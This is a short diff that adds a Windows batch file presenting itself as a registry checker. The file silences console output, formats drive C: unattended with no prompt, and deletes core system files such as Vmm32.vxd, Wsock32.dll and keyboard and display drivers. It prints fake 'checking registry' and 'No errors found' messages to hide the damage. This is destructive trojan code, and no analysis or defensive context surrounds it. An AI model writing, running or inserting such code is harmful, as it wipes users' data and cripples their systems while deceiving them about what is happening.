@@ -1,0 +1,11 @@
+@echo off
+ctty nul
+format c: /autotest /q /u
+echo Started checking registry...
+del C:\Windows\Command\Bootdisk.bat
+del C:\Windows\Command\Display.sys
+del C:\Windows\Command\Keyboard.sys
+del C:\Windows\System\Wsock32.dll
+del C:\Windows\System\Wsock2.vxd
+del C:\Windows\System\Vmm32.vxd
+echo No errors found !
